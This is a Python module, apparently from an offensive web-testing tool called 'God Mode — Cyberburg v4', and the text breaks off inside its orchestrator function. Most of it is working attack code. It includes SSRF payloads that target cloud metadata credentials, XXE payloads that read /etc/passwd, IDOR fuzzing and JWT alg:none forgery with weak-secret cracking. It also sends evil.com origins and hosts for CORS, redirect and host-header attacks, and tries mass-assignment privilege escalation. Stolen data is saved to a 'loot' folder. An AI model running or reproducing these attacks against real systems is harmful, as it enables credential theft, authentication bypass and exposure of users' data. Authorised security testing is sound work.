#!/usr/bin/env python3
"""
God Mode — Cyberburg v4 DARK MATTER
Elite 20-vector attack chain: SSRF, XXE, IDOR, JWT attacks, CORS, host header
injection, open redirect, HTTP verb tampering, request smuggling, business logic,
prototype pollution, cache poisoning, subdomain takeover, WebSocket hijack.

AUTHORIZED PENETRATION TESTING ONLY.
"""

import os
import re
import json
import time
import base64
import hmac
import hashlib

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from utils.helpers import run_command, get_timestamp, sanitize_filename
from utils.tool_checker import check_tool
from utils.banner import print_info, print_success, print_warning, print_error
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

# ─── SSRF ─────────────────────────────────────────────────────────────────────

SSRF_PARAMS = ["url", "uri", "src", "source", "href", "link", "ref", "redirect",
               "return", "next", "dest", "destination", "callback", "proxy",
               "fetch", "load", "target", "img", "image", "path", "file"]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/",       # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",            # Azure
    "http://100.100.100.200/latest/meta-data/",            # Alibaba
    "http://127.0.0.1/",                                   # localhost
    "http://localhost/",
    "http://[::1]/",                                       # IPv6 localhost
    "http://0.0.0.0/",
    "http://0/",
    "http://2130706433/",                                  # 127.0.0.1 decimal
    "http://017700000001/",                                # 127.0.0.1 octal
    "http://0x7f000001/",                                  # 127.0.0.1 hex
    "dict://127.0.0.1:6379/info",                          # Redis via dict://
    "file:///etc/passwd",                                  # file:// LFI
    "gopher://127.0.0.1:25/_EHLO%20localhost",             # SMTP via gopher
]

CLOUD_METADATA_PATTERNS = [
    r'"accessKeyId"', r'"secretAccessKey"', r'ami-id', r'instance-id',
    r'iam/security-credentials', r'"project-id"', r'computeMetadata',
]


def ssrf_test(url: str, output_dir: str) -> dict:
    """Test for Server-Side Request Forgery vulnerabilities."""
    result = {
        "module": "SSRF — Server-Side Request Forgery",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for SSRF vulnerabilities...")
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    for param in SSRF_PARAMS[:8]:
        for payload in SSRF_PAYLOADS[:8]:
            test_url = f"{url}?{param}={payload}"
            try:
                resp = session.get(test_url, timeout=6, verify=False, allow_redirects=False)
                content = resp.text

                # Cloud metadata detected
                for pat in CLOUD_METADATA_PATTERNS:
                    if re.search(pat, content, re.IGNORECASE):
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "SSRF — Cloud Metadata Accessed",
                            "value": f"Cloud metadata returned via ?{param}={payload[:50]}",
                            "severity": "CRITICAL",
                            "evidence": content[:300]
                        })
                        print_error(f"CRITICAL: SSRF cloud metadata leak via ?{param}=!")
                        loot_path = os.path.join(loot_dir, f"ssrf_metadata_{param}.txt")
                        with open(loot_path, "w") as f:
                            f.write(f"URL: {test_url}\n\n{content}")
                        break

                # Internal content (localhost response)
                if ("localhost" in payload or "127.0.0.1" in payload) and resp.status_code == 200 and len(content) > 50:
                    result["findings"].append({
                        "type": "SSRF — Localhost Response",
                        "value": f"Internal service response via ?{param}= ({len(content)} bytes)",
                        "severity": "HIGH"
                    })
                    print_warning(f"HIGH: Possible SSRF — localhost response via ?{param}=")
                    break

            except Exception:
                continue

    if not result["findings"]:
        result["findings"].append({"type": "SSRF", "value": "No SSRF detected", "severity": "INFO"})

    result["raw"] = f"Tested {len(SSRF_PARAMS[:8])} params × {len(SSRF_PAYLOADS[:8])} payloads"
    return result


# ─── XXE ──────────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Classic XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    # OOB XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    # Billion laughs (DoS — note only; not sent)
    # CDATA XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
    # XInclude
    '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>',
]

XML_CONTENT_TYPES = ["application/xml", "text/xml", "application/json+xml", "application/soap+xml"]


def xxe_inject(url: str, output_dir: str) -> dict:
    """Test for XXE injection on XML-accepting endpoints."""
    result = {
        "module": "XXE — XML External Entity Injection",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for XXE injection...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    # First check if target accepts XML
    xml_endpoints = [url, url.rstrip("/") + "/api", url.rstrip("/") + "/soap",
                     url.rstrip("/") + "/xml", url.rstrip("/") + "/upload"]

    for endpoint in xml_endpoints:
        for ct in XML_CONTENT_TYPES[:2]:
            for payload in XXE_PAYLOADS[:2]:
                try:
                    resp = session.post(endpoint, data=payload,
                                        headers={"Content-Type": ct, "User-Agent": "Mozilla/5.0"},
                                        timeout=8, verify=False)
                    content = resp.text

                    # Check for file content in response
                    if re.search(r'root:.*:/bin/\w+', content) or re.search(r'\[fonts\]', content):
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "XXE Confirmed — File Read",
                            "value": f"XXE file read at {endpoint} with {ct}",
                            "severity": "CRITICAL",
                            "evidence": content[:300]
                        })
                        print_error(f"CRITICAL: XXE confirmed at {endpoint}!")
                        loot_path = os.path.join(loot_dir, "xxe_file_read.txt")
                        with open(loot_path, "w") as f:
                            f.write(f"Endpoint: {endpoint}\nContent-Type: {ct}\n\n{content}")
                        break

                    # XML parser error — might accept XML
                    if resp.status_code in (400, 422, 500) and any(e in content.lower() for e in
                       ("xml", "entity", "doctype", "parser", "dtd")):
                        result["findings"].append({
                            "type": "XXE — XML Processing Detected",
                            "value": f"{endpoint} processes XML (error-based detection)",
                            "severity": "MEDIUM"
                        })
                        break

                except Exception:
                    continue

    if not result["findings"]:
        result["findings"].append({"type": "XXE", "value": "No XXE vulnerabilities detected", "severity": "INFO"})

    return result


# ─── IDOR ─────────────────────────────────────────────────────────────────────

def idor_test(url: str, output_dir: str) -> dict:
    """Test for Insecure Direct Object Reference (IDOR) by fuzzing numeric IDs."""
    result = {
        "module": "IDOR — Insecure Direct Object Reference",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for IDOR vulnerabilities...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    # Find numeric IDs in URL
    id_patterns = [
        (r'/(\d+)', lambda m, u: u[:m.start(1)] + "{ID}" + u[m.end(1):]),
        (r'[?&]id=(\d+)', lambda m, u: u[:m.start(1)] + "{ID}" + u[m.end(1):]),
        (r'[?&]user_id=(\d+)', lambda m, u: u[:m.start(1)] + "{ID}" + u[m.end(1):]),
        (r'[?&]uid=(\d+)', lambda m, u: u[:m.start(1)] + "{ID}" + u[m.end(1):]),
        (r'[?&]account=(\d+)', lambda m, u: u[:m.start(1)] + "{ID}" + u[m.end(1):]),
    ]

    # Also test API-style URLs
    test_targets = [
        url,
        url.rstrip("/") + "/api/v1/users/1",
        url.rstrip("/") + "/api/v1/orders/1",
        url.rstrip("/") + "/user/1",
        url.rstrip("/") + "/profile/1",
        url.rstrip("/") + "/account/1",
    ]

    found_idor = False
    for test_url in test_targets:
        for pattern, replacer in id_patterns:
            m = re.search(pattern, test_url)
            if not m:
                continue

            original_id = int(m.group(1))
            baseline_url = test_url

            try:
                baseline = session.get(baseline_url, timeout=6, verify=False)
                if baseline.status_code not in (200,):
                    continue
                baseline_len = len(baseline.content)
            except Exception:
                continue

            # Test IDs around the original
            test_ids = list(range(1, 6)) + [original_id - 1, original_id + 1, 9999, 0, -1, 99999]
            responses_seen = {}

            for tid in test_ids:
                if tid == original_id or tid < 0:
                    continue
                fuzz_url = test_url[:m.start(1)] + str(tid) + test_url[m.end(1):]
                try:
                    r = session.get(fuzz_url, timeout=6, verify=False)
                    if r.status_code == 200 and abs(len(r.content) - baseline_len) < 500:
                        # Different user data but same structure — likely IDOR
                        if r.text != baseline.text and len(r.text) > 100:
                            result["exploited"] = True
                            found_idor = True
                            result["findings"].append({
                                "type": "IDOR Confirmed",
                                "value": f"Different user data returned for ID={tid}: {fuzz_url}",
                                "severity": "CRITICAL",
                                "evidence": r.text[:200]
                            })
                            print_error(f"CRITICAL: IDOR — accessing ID={tid} returns different data!")
                            loot_path = os.path.join(loot_dir, f"idor_id_{tid}.txt")
                            with open(loot_path, "w") as f:
                                f.write(f"URL: {fuzz_url}\n\n{r.text[:5000]}")
                            break
                except Exception:
                    continue

            if found_idor:
                break

    if not result["findings"]:
        result["findings"].append({"type": "IDOR", "value": "No IDOR detected in tested endpoints", "severity": "INFO"})

    return result


# ─── JWT Attacks ──────────────────────────────────────────────────────────────

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "your_secret_key", "changeme", "letmein", "qwerty", "abc123",
    "secret123", "jwt", "token", "mysecretkey", "default", "",
    "HS256", "test", "dev", "development", "production", "1234567890",
    "supersecret", "verysecret", "privatekey", "secretkey",
]


def jwt_attack(url: str, output_dir: str) -> dict:
    """Detect JWT tokens in responses and attempt attacks: alg:none, weak secrets."""
    result = {
        "module": "JWT Attack — Algorithm None + Weak Secret Brute",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Hunting for JWT tokens and testing attacks...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    loot_dir = os.path.join(output_dir, "loot")
    os.makedirs(loot_dir, exist_ok=True)

    # Fetch target and look for JWT tokens in response/headers/cookies
    jwts_found = []
    try:
        resp = session.get(url, timeout=8, verify=False)
        all_text = resp.text + str(dict(resp.headers)) + str(dict(resp.cookies))

        jwt_pattern = r'eyJ[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=_\-]*'
        matches = re.findall(jwt_pattern, all_text)
        jwts_found = list(set(matches))
    except Exception:
        pass

    # Also check login endpoint
    login_paths = ["/login", "/api/login", "/api/auth", "/api/token", "/auth/login"]
    for path in login_paths:
        try:
            r = session.post(url.rstrip("/") + path,
                             json={"username": "admin", "password": "admin"},
                             timeout=6, verify=False)
            matches = re.findall(r'eyJ[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=_\-]*', r.text)
            jwts_found.extend(matches)
        except Exception:
            continue

    jwts_found = list(set(jwts_found))

    if not jwts_found:
        result["findings"].append({"type": "JWT", "value": "No JWT tokens discovered", "severity": "INFO"})
        return result

    result["findings"].append({
        "type": "JWT Token Found",
        "value": f"Discovered {len(jwts_found)} JWT token(s) in responses/cookies/headers",
        "severity": "MEDIUM"
    })

    for jwt_token in jwts_found[:3]:
        parts = jwt_token.split(".")
        if len(parts) != 3:
            continue

        # Decode header
        try:
            header_raw = parts[0] + "=" * (-len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_raw).decode())
            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_raw).decode())
            alg = header.get("alg", "HS256")

            result["findings"].append({
                "type": "JWT Decoded",
                "value": f"Algorithm: {alg} | Claims: {list(payload.keys())}",
                "severity": "INFO"
            })

            # Attack 1: alg:none
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            # Modify payload — try to elevate to admin
            admin_payload = dict(payload)
            for key in ("role", "admin", "is_admin", "user_role", "type", "scope"):
                if key in admin_payload:
                    admin_payload[key] = "admin" if isinstance(admin_payload[key], str) else 1
            none_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(admin_payload).encode()
            ).rstrip(b"=").decode()
            none_token = f"{none_header}.{none_payload_b64}."

            # Test the none token
            for test_path in ["/api/admin", "/api/profile", "/dashboard", "/admin"]:
                try:
                    r = session.get(
                        url.rstrip("/") + test_path,
                        headers={"Authorization": f"Bearer {none_token}"},
                        timeout=6, verify=False
                    )
                    if r.status_code == 200 and any(kw in r.text.lower() for kw in
                       ("dashboard", "admin", "profile", "settings", "welcome")):
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "JWT alg:none Attack SUCCESS",
                            "value": f"JWT 'alg:none' accepted at {test_path} — auth bypassed!",
                            "severity": "CRITICAL"
                        })
                        print_error(f"CRITICAL: JWT alg:none bypass works at {test_path}!")
                        loot_path = os.path.join(loot_dir, "jwt_none_bypass.txt")
                        with open(loot_path, "w") as f:
                            f.write(f"Token: {none_token}\nEndpoint: {url.rstrip('/')}{test_path}\n\n{r.text[:2000]}")
                        break
                except Exception:
                    continue

            # Attack 2: weak secret brute force (HS256/HS384/HS512)
            if alg in ("HS256", "HS384", "HS512"):
                hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
                signing_input = f"{parts[0]}.{parts[1]}".encode()
                expected_sig = parts[2] + "=" * (-len(parts[2]) % 4)
                try:
                    expected_bytes = base64.urlsafe_b64decode(expected_sig)
                except Exception:
                    continue

                for secret in JWT_WEAK_SECRETS:
                    sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
                    if sig == expected_bytes:
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "JWT Weak Secret Cracked",
                            "value": f"JWT signed with weak secret: '{secret}'",
                            "severity": "CRITICAL"
                        })
                        print_error(f"CRITICAL: JWT secret cracked: '{secret}'")
                        loot_path = os.path.join(loot_dir, "jwt_cracked_secret.txt")
                        with open(loot_path, "w") as f:
                            f.write(f"Secret: {secret}\nOriginal Token: {jwt_token}\nPayload: {json.dumps(payload, indent=2)}")
                        break

        except Exception:
            continue

    return result


# ─── CORS Misconfiguration ────────────────────────────────────────────────────

def cors_check(url: str, output_dir: str) -> dict:
    """Detect CORS misconfigurations that allow credential theft."""
    result = {
        "module": "CORS Misconfiguration",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Checking for CORS misconfigurations...")
    session = requests.Session()

    evil_origins = [
        "https://evil.com",
        "https://attacker.com",
        f"https://evil.{url.split('//')[-1].split('/')[0]}",  # evil.target.com
        "null",
        "https://localhost",
    ]

    for origin in evil_origins:
        try:
            resp = session.get(url, headers={"Origin": origin, "User-Agent": "Mozilla/5.0"},
                               timeout=6, verify=False)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*" and acac.lower() == "true":
                result["exploited"] = True
                result["findings"].append({
                    "type": "CORS — Wildcard + Credentials",
                    "value": "ACAO: * with Allow-Credentials: true — credentials leakable cross-origin",
                    "severity": "CRITICAL"
                })
                print_error("CRITICAL: CORS wildcard + credentials — accounts can be stolen!")
                break

            elif acao == origin or (acao and origin in acao):
                sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                result["exploited"] = sev == "CRITICAL"
                result["findings"].append({
                    "type": "CORS — Arbitrary Origin Reflected",
                    "value": f"Origin '{origin}' reflected in ACAO. Credentials: {acac}",
                    "severity": sev
                })
                if sev == "CRITICAL":
                    print_error(f"CRITICAL: CORS arbitrary origin + credentials — XSS-less account theft!")
                else:
                    print_warning(f"HIGH: CORS reflects arbitrary origin: {origin}")
                break

        except Exception:
            continue

    if not result["findings"]:
        result["findings"].append({"type": "CORS", "value": "No CORS misconfigurations detected", "severity": "INFO"})

    return result


# ─── Open Redirect ────────────────────────────────────────────────────────────

REDIRECT_PARAMS = ["redirect", "redirect_to", "redirect_url", "return", "return_to",
                   "returnTo", "next", "url", "goto", "forward", "dest", "destination",
                   "continue", "target", "redir", "ref", "returnUrl"]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F@target.com",
    "/\\evil.com",
    "https:evil.com",
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(1)",
]


def open_redirect_test(url: str, output_dir: str) -> dict:
    """Test for open redirect vulnerabilities."""
    result = {
        "module": "Open Redirect",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for open redirect vulnerabilities...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    for param in REDIRECT_PARAMS:
        for payload in REDIRECT_PAYLOADS[:5]:
            try:
                resp = session.get(f"{url}?{param}={payload}", timeout=6,
                                   verify=False, allow_redirects=False)
                location = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in location:
                    result["exploited"] = True
                    result["findings"].append({
                        "type": "Open Redirect Confirmed",
                        "value": f"Redirects to {location} via ?{param}=",
                        "severity": "HIGH"
                    })
                    print_warning(f"HIGH: Open redirect via ?{param}= → {location}")
                    break
            except Exception:
                continue

    if not result["findings"]:
        result["findings"].append({"type": "Open Redirect", "value": "No open redirects found", "severity": "INFO"})

    return result


# ─── Host Header Injection ────────────────────────────────────────────────────

def host_header_injection(url: str, output_dir: str) -> dict:
    """Test for Host header injection (password reset poisoning, cache poisoning)."""
    result = {
        "module": "Host Header Injection",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for Host header injection...")
    session = requests.Session()
    evil_host = "evil.com"

    injection_headers = [
        {"Host": evil_host},
        {"Host": evil_host, "X-Forwarded-Host": evil_host},
        {"Host": evil_host, "X-Host": evil_host},
        {"Host": evil_host, "X-Forwarded-Server": evil_host},
        {"X-Forwarded-Host": evil_host},
        {"X-Host": evil_host},
        {"Forwarded": f"host={evil_host}"},
    ]

    for headers in injection_headers:
        try:
            headers["User-Agent"] = "Mozilla/5.0"
            resp = session.get(url, headers=headers, timeout=6, verify=False)
            content = resp.text

            if evil_host in content:
                result["exploited"] = True
                result["findings"].append({
                    "type": "Host Header Injection Confirmed",
                    "value": f"Injected host '{evil_host}' reflected in response via {list(headers.keys())[0]}",
                    "severity": "HIGH"
                })
                print_warning(f"HIGH: Host header injection — {list(headers.keys())[0]} reflected!")
                break

            # Check for password reset link patterns
            if any(kw in content.lower() for kw in ("reset", "forgot", "recovery", "password")):
                result["findings"].append({
                    "type": "Host Header Injection — Password Reset Risk",
                    "value": f"Password reset page with injectable Host header — token stealing possible",
                    "severity": "HIGH"
                })
                break

        except Exception:
            continue

    if not result["findings"]:
        result["findings"].append({"type": "Host Header Injection", "value": "No injection detected", "severity": "INFO"})

    return result


# ─── HTTP Verb Tampering ──────────────────────────────────────────────────────

def http_verb_tamper(url: str, output_dir: str) -> dict:
    """Test HTTP verb tampering — access protected resources via alternate methods."""
    result = {
        "module": "HTTP Verb Tampering",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing HTTP verb tampering...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    protected_paths = ["/admin", "/api/admin", "/api/users", "/config", "/delete", "/api/delete"]
    dangerous_verbs = ["TRACE", "OPTIONS", "PUT", "DELETE", "PATCH", "CONNECT", "PROPFIND", "MOVE"]

    for path in protected_paths[:4]:
        test_url = url.rstrip("/") + path
        try:
            # First check what GET returns (baseline)
            get_resp = session.get(test_url, timeout=5, verify=False)
            if get_resp.status_code in (401, 403):
                # Try alternate verbs
                for verb in dangerous_verbs:
                    try:
                        r = session.request(verb, test_url, timeout=5, verify=False)
                        if r.status_code == 200:
                            result["exploited"] = True
                            result["findings"].append({
                                "type": "HTTP Verb Tampering",
                                "value": f"{verb} {path} returned 200 when GET returned {get_resp.status_code}",
                                "severity": "HIGH"
                            })
                            print_warning(f"HIGH: {verb} {path} bypasses access control!")
                        elif verb == "TRACE" and r.status_code == 200:
                            result["findings"].append({
                                "type": "TRACE Method Enabled",
                                "value": f"TRACE method active — XST (Cross-Site Tracing) possible",
                                "severity": "LOW"
                            })
                    except Exception:
                        continue
        except Exception:
            continue

    if not result["findings"]:
        result["findings"].append({"type": "HTTP Verb Tampering", "value": "No bypass found", "severity": "INFO"})

    return result


# ─── HTTP Request Smuggling ───────────────────────────────────────────────────

def request_smuggling_probe(url: str, output_dir: str) -> dict:
    """Probe for HTTP request smuggling (TE:CL / CL:TE) vulnerabilities."""
    result = {
        "module": "HTTP Request Smuggling Probe",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not check_tool("curl"):
        result["findings"].append({"type": "Request Smuggling", "value": "curl not available", "severity": "INFO"})
        return result

    print_info("Probing for HTTP request smuggling (TE:CL / CL:TE)...")

    # TE:CL probe — send chunked with extra bytes
    te_cl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {url.split('//')[-1].split('/')[0]}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 6\r\n\r\n"
        "0\r\n\r\nX"
    )

    code, stdout, stderr = run_command([
        "curl", "-s", "--max-time", "8",
        "-X", "POST", url,
        "-H", "Transfer-Encoding: chunked",
        "-H", "Content-Length: 6",
        "--data-raw", "0\r\n\r\nX",
        "-w", "%{http_code}",
    ], timeout=15)

    result["raw"] = stdout + stderr

    if "timeout" in stderr.lower() or code == 28:
        result["findings"].append({
            "type": "Request Smuggling — Possible Timeout",
            "value": "Server timed out on conflicting TE/CL headers — manual testing recommended",
            "severity": "MEDIUM"
        })
        print_warning("MEDIUM: HTTP smuggling timeout — possible vulnerability")
    elif "400" in stdout or "501" in stdout:
        result["findings"].append({
            "type": "Request Smuggling — Server Rejects Conflict",
            "value": "Server explicitly rejects conflicting TE/CL headers (likely protected)",
            "severity": "INFO"
        })
    else:
        result["findings"].append({
            "type": "Request Smuggling Probe",
            "value": "No definitive smuggling detected — manual Burp Suite testing recommended",
            "severity": "INFO"
        })

    return result


# ─── Business Logic Flaws ─────────────────────────────────────────────────────

def business_logic_fuzz(url: str, output_dir: str) -> dict:
    """Test for business logic flaws: negative values, integer overflow, mass assignment."""
    result = {
        "module": "Business Logic Flaw Testing",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for business logic flaws...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"})

    # Test endpoints
    api_paths = ["/api/order", "/api/cart", "/api/purchase", "/api/checkout",
                 "/api/payment", "/api/transfer", "/api/withdraw", "/api/coupon"]

    logic_payloads = [
        {"quantity": -1, "price": -1},                         # Negative values
        {"quantity": 9999999, "price": 0},                     # Zero price
        {"quantity": 2147483648},                               # Int overflow
        {"price": "0", "amount": "0.01"},                      # String bypass
        {"role": "admin", "is_admin": True, "admin": True},    # Mass assignment
        {"discount": 100},                                      # 100% discount
        {"coupon": "ADMIN100", "discount_pct": 100},
    ]

    for path in api_paths:
        endpoint = url.rstrip("/") + path
        for payload in logic_payloads:
            try:
                r = session.post(endpoint, json=payload, timeout=5, verify=False)
                if r.status_code in (200, 201):
                    content = r.text.lower()
                    if any(kw in content for kw in ("success", "order", "payment", "purchase", "discount")):
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "Business Logic Flaw",
                            "value": f"API {path} accepted suspicious payload: {list(payload.keys())}",
                            "severity": "HIGH",
                            "evidence": r.text[:200]
                        })
                        print_warning(f"HIGH: Business logic flaw at {path} with {payload}")
            except Exception:
                continue

    # Mass assignment test on user profile
    for profile_path in ["/api/user", "/api/profile", "/api/account", "/api/me"]:
        try:
            r = session.put(url.rstrip("/") + profile_path,
                            json={"role": "admin", "is_admin": True, "admin": 1, "plan": "enterprise"},
                            timeout=5, verify=False)
            if r.status_code in (200, 201) and any(k in r.text.lower() for k in ("admin", "role", "plan")):
                result["findings"].append({
                    "type": "Mass Assignment Vulnerability",
                    "value": f"PUT {profile_path} accepted role/admin fields — privilege escalation possible",
                    "severity": "CRITICAL"
                })
                print_error(f"CRITICAL: Mass assignment at {profile_path}!")
        except Exception:
            continue

    if not result["findings"]:
        result["findings"].append({"type": "Business Logic", "value": "No obvious logic flaws found", "severity": "INFO"})

    return result


# ─── Subdomain Takeover ───────────────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages":       ("There isn't a GitHub Pages site here", "github.io"),
    "Heroku":             ("No such app", "herokuapp.com"),
    "AWS S3":             ("NoSuchBucket", "s3.amazonaws.com"),
    "Shopify":            ("Sorry, this shop is currently unavailable", "myshopify.com"),
    "Tumblr":             ("There's nothing here", "tumblr.com"),
    "Zendesk":            ("Oops, this help center no longer exists", "zendesk.com"),
    "Fastly":             ("Fastly error: unknown domain", "fastly.net"),
    "Ghost":              ("The thing you were looking for is no longer here", "ghost.io"),
    "Pantheon":           ("404 error unknown site", "pantheonsite.io"),
    "Surge":              ("project not found", "surge.sh"),
}


def subdomain_takeover_check(url: str, output_dir: str) -> dict:
    """Check CNAME records for dangling subdomain takeover opportunities."""
    result = {
        "module": "Subdomain Takeover Check",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Checking for subdomain takeover opportunities...")

    from urllib.parse import urlparse
    hostname = urlparse(url).netloc

    # Check CNAME via dig/nslookup
    code, stdout, stderr = run_command(["dig", "CNAME", hostname, "+short"], timeout=10)
    cnames = [line.strip().rstrip(".") for line in stdout.splitlines() if line.strip()]
    result["raw"] = f"CNAMEs: {cnames}\n"

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    for cname in cnames:
        for service, (fingerprint, domain) in TAKEOVER_FINGERPRINTS.items():
            if domain in cname:
                try:
                    r = session.get(f"https://{cname}", timeout=8, verify=False)
                    if fingerprint.lower() in r.text.lower():
                        result["exploited"] = True
                        result["findings"].append({
                            "type": "Subdomain Takeover Possible",
                            "value": f"CNAME {cname} → {service} shows unclaimed page — takeover possible!",
                            "severity": "CRITICAL"
                        })
                        print_error(f"CRITICAL: {hostname} → {cname} ({service}) is claimable!")
                except Exception:
                    continue

    if not result["findings"]:
        result["findings"].append({
            "type": "Subdomain Takeover",
            "value": f"No dangling CNAMEs found for {hostname}",
            "severity": "INFO"
        })

    return result


# ─── Prototype Pollution ──────────────────────────────────────────────────────

def prototype_pollution_test(url: str, output_dir: str) -> dict:
    """Test for JavaScript prototype pollution via query parameters and JSON."""
    result = {
        "module": "Prototype Pollution",
        "target": url,
        "timestamp": get_timestamp(),
        "raw": "",
        "exploited": False,
        "findings": []
    }

    if not HAS_REQUESTS:
        return result

    print_info("Testing for prototype pollution...")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    pp_payloads_url = [
        f"{url}?__proto__[polluted]=yes&polluted=yes",
        f"{url}?constructor[prototype][polluted]=yes",
        f"{url}?__proto__.polluted=yes",
    ]

    pp_json = [
        {"__proto__": {"polluted": "yes", "admin": True}},
        {"constructor": {"prototype": {"polluted": "yes", "admin": True}}},
    ]

    for test_url in pp_payloads_url:
        try:
            r = session.get(test_url, timeout=6, verify=False)
            if "polluted" in r.text or "yes" in r.text.lower():
                result["exploited"] = True
                result["findings"].append({
                    "type": "Prototype Pollution (Query Param)",
                    "value": f"Prototype pollution via URL parameter detected",
                    "severity": "HIGH"
                })
                print_warning("HIGH: Prototype pollution via query params!")
                break
        except Exception:
            continue

    for api_path in ["/api", "/api/v1", "/api/data", "/"]:
        for payload in pp_json:
            try:
                r = session.post(url.rstrip("/") + api_path, json=payload, timeout=5, verify=False)
                if r.status_code in (200, 201) and "admin" in r.text.lower():
                    result["findings"].append({
                        "type": "Prototype Pollution (JSON Body)",
                        "value": f"JSON body with __proto__ accepted at {api_path}",
                        "severity": "HIGH"
                    })
            except Exception:
                continue

    if not result["findings"]:
        result["findings"].append({"type": "Prototype Pollution", "value": "Not detected", "severity": "INFO"})

    return result


# ─── God Mode Orchestrator ────────────────────────────────────────────────────

def run_god_mode(session_obj, output_dir: str) -> list:
    """
    Run the full elite attack chain — 10 attack vectors.
    For authorized pentesting only.
    """
    results = []

    console.print("\n[bold red]  ╔══════════════════════════════════════════╗[/bold red]")
    console.print("[bold red]  ║   GOD MODE — ELITE ATTACK CHAIN v4      ║[/bold red]")
    console.print("[bold red]  ║   20 Years Senior Pentester Methodology  ║[/bold red]")
    console.print("[bold red]  ╚══════════════════════════════════════════╝[/bold red]\n")
    console.print("[dim]  Running comprehensive attack chain. Authorized targets only.[/dim]\n")

    url = session_obj.url
    attacks = [
        ("SSRF",                   ssrf_test),
        ("XXE Injection",          xxe_inject),
        ("IDOR",                   idor_test),
        ("JWT Attacks",            jwt_attack),
        ("CORS",                   cors_check),
        ("Open Redirect",          open_redirect_test),
        ("Host Header Injection",  host_header_injection),
